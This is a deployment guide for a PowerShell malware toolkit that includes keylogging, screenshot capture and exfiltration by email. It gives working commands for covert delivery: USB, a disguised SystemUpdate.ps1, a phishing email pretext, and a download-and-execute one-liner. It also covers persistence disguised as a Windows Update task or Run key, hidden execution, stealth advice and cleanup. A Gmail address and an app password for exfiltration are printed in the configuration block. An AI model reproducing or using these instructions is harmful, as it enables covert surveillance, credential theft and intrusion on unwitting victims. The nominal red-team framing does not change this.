# PowerShell Malware Toolkit - Deployment Guide

## 🚀 Deployment Options

### **Option 1: GitHub Repository (Recommended for Teams)**

#### **Setup GitHub Repository:**
```bash
# Initialize git
git init
git add .
git commit -m "Initial PowerShell toolkit"

# Create GitHub repo and push
git remote add origin https://github.com/yourusername/powershell-toolkit.git
git push -u origin main
```

#### **Deploy from GitHub:**
```powershell
# On target system
git clone https://github.com/yourusername/powershell-toolkit.git
cd powershell-toolkit
.\Deploy.ps1 -Obfuscate
```

**✅ Pros:** Version control, easy updates, professional
**❌ Cons:** Internet required, GitHub logs activity

---

### **Option 2: USB Deployment (Stealth)**

#### **Prepare USB Package:**
```powershell
# Create deployment package
.\Deploy.ps1 -Obfuscate -CreateExecutable -OutputPath ".\USB-Package"

# Copy to USB drive
Copy-Item -Path ".\USB-Package\*" -Destination "E:\MalwareToolkit\" -Recurse
```

#### **Deploy from USB:**
```powershell
# On target system
E:\MalwareToolkit\SystemUpdate.ps1
```

**✅ Pros:** No internet, no digital traces, portable
**❌ Cons:** Physical access required, USB can be lost

---

### **Option 3: Single File Deployment (Ultimate Stealth)**

#### **Use SingleFile.ps1:**
```powershell
# Copy single file to target
Copy-Item ".\SingleFile.ps1" -Destination "C:\temp\SystemUpdate.ps1"

# Execute on target
powershell.exe -ExecutionPolicy Bypass -File "C:\temp\SystemUpdate.ps1"
```

**✅ Pros:** Single file, maximum stealth, no dependencies
**❌ Cons:** Larger file size, harder to maintain

---

### **Option 4: Email Attachment (Social Engineering)**

#### **Prepare Email Package:**
```powershell
# Create compressed package
.\Deploy.ps1 -Obfuscate -OutputPath ".\Email-Package"
Compress-Archive -Path ".\Email-Package\*" -DestinationPath "SystemUpdate.zip"
```

#### **Send via Email:**
- Attach `SystemUpdate.zip` to email
- Social engineering pretext: "System Update Required"
- Instructions: Extract and run `SystemUpdate.ps1`

**✅ Pros:** Remote deployment, social engineering
**❌ Cons:** Email filtering, user awareness

---

## 🎯 Recommended Deployment Strategy

### **For Red Team Testing:**

#### **Phase 1: Preparation**
```powershell
# 1. Configure email settings in Main.ps1
$Config = @{
    Email = "coccoder999@gmail.com"
    Password = "plby syha oaga jwtu"
    SmtpServer = "smtp.gmail.com"
    SmtpPort = 587
    UseTls = $true
}

# 2. Create deployment package
.\Deploy.ps1 -Obfuscate -CreateExecutable -OutputPath ".\Deployed"
```

#### **Phase 2: Deployment**
```powershell
# Option A: USB Deployment (Recommended)
Copy-Item -Path ".\Deployed\*" -Destination "E:\" -Recurse

# Option B: Single File (Maximum Stealth)
Copy-Item ".\SingleFile.ps1" -Destination "C:\temp\SystemUpdate.ps1"
```

#### **Phase 3: Execution**
```powershell
# Method 1: Direct execution
powershell.exe -ExecutionPolicy Bypass -File "SystemUpdate.ps1"

# Method 2: Silent execution
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "SystemUpdate.ps1" -Silent

# Method 3: With elevation
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File SystemUpdate.ps1" -Verb RunAs
```

---

## 📋 Deployment Checklist

### **Pre-Deployment:**
- [ ] Email configuration updated
- [ ] Obfuscation applied
- [ ] Package created
- [ ] Test on isolated system
- [ ] Backup original files

### **Deployment:**
- [ ] Target system identified
- [ ] Access method determined
- [ ] Package transferred
- [ ] Execution method planned
- [ ] Persistence verified

### **Post-Deployment:**
- [ ] Initial execution successful
- [ ] Persistence mechanisms active
- [ ] Surveillance data collected
- [ ] Exfiltration working
- [ ] Cleanup plan ready

---

## 🔧 Advanced Deployment Techniques

### **1. Encoded Command Execution**
```powershell
# Encode the script
$ScriptContent = Get-Content ".\SystemUpdate.ps1" -Raw
$EncodedScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ScriptContent))

# Execute encoded script
powershell.exe -EncodedCommand $EncodedScript
```

### **2. One-Liner Execution**
```powershell
# Download and execute from URL
powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/yourusername/powershell-toolkit/main/SingleFile.ps1')"
```

### **3. Scheduled Task Deployment**
```powershell
# Create scheduled task for delayed execution
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\temp\SystemUpdate.ps1"
$Trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes 5)
Register-ScheduledTask -TaskName "Windows Update Service" -Action $Action -Trigger $Trigger -Force
```

### **4. Registry-Based Deployment**
```powershell
# Add to registry for execution at logon
$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegistryPath -Name "WindowsUpdateService" -Value "powershell.exe -ExecutionPolicy Bypass -File C:\temp\SystemUpdate.ps1"
```

---

## 🛡️ Stealth Considerations

### **File Naming:**
- Use generic names: `SystemUpdate.ps1`, `WindowsService.ps1`
- Avoid suspicious names: `malware.ps1`, `keylogger.ps1`

### **Execution Methods:**
- Use `-WindowStyle Hidden` for silent execution
- Use `-ExecutionPolicy Bypass` to avoid policy issues
- Use `-Silent` parameter for minimal output

### **Network Communication:**
- Use HTTPS for all communications
- Implement rate limiting
- Use legitimate user agents
- Multiple fallback endpoints

### **File System:**
- Use temporary directories
- Implement file cleanup
- Avoid suspicious file extensions
- Use compression for data

---

## 📊 Monitoring & Verification

### **Check if Running:**
```powershell
# Check for running jobs
Get-Job | Where-Object {$_.State -eq "Running"}

# Check for persistence
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object WindowsUpdateService

# Check for scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskName -like "*Windows*Update*"}
```

### **Check Data Collection:**
```powershell
# Check log files
Get-ChildItem "$env:TEMP\SystemCache" -Recurse

# Check keylogger data
Get-Content "$env:TEMP\SystemCache\keylog.txt" -Tail 10

# Check screenshots
Get-ChildItem "$env:TEMP\SystemCache\Screenshots" | Measure-Object
```

### **Check Exfiltration:**
```powershell
# Check email sending
# Monitor SMTP traffic on port 587

# Check HTTP exfiltration
# Monitor HTTPS traffic to configured endpoints
```

---

## 🚨 Cleanup Procedures

### **Remove Persistence:**
```powershell
# Remove registry entry
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService"

# Remove scheduled task
Unregister-ScheduledTask -TaskName "Windows System Update" -Confirm:$false

# Remove startup shortcut
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.lnk" -Force

# Remove WMI subscriptions
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Where-Object {$_.Name -like "*WindowsUpdate*"} | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer | Where-Object {$_.Name -like "*WindowsUpdate*"} | Remove-WmiObject
```

### **Stop Surveillance:**
```powershell
# Stop all jobs
Get-Job | Stop-Job
Get-Job | Remove-Job

# Clean up files
Remove-Item "$env:TEMP\SystemCache" -Recurse -Force
```

### **Remove Script:**
```powershell
# Remove script files
Remove-Item "C:\temp\SystemUpdate.ps1" -Force
Remove-Item "E:\MalwareToolkit" -Recurse -Force
```

---

## 📞 Support & Troubleshooting

### **Common Issues:**

#### **Execution Policy Error:**
```powershell
# Set execution policy
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

#### **Permission Denied:**
```powershell
# Run as administrator
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File SystemUpdate.ps1" -Verb RunAs
```

#### **Email Not Sending:**
- Check Gmail app password
- Verify 2FA is enabled
- Check firewall settings
- Test SMTP connection

#### **Persistence Not Working:**
- Run as administrator
- Check Windows Defender
- Verify user permissions
- Check system policies

### **Debug Mode:**
```powershell
# Enable verbose output
$VerbosePreference = "Continue"
.\SystemUpdate.ps1 -Verbose
```

---

**Remember:** Always ensure proper authorization before deploying any security testing tools. 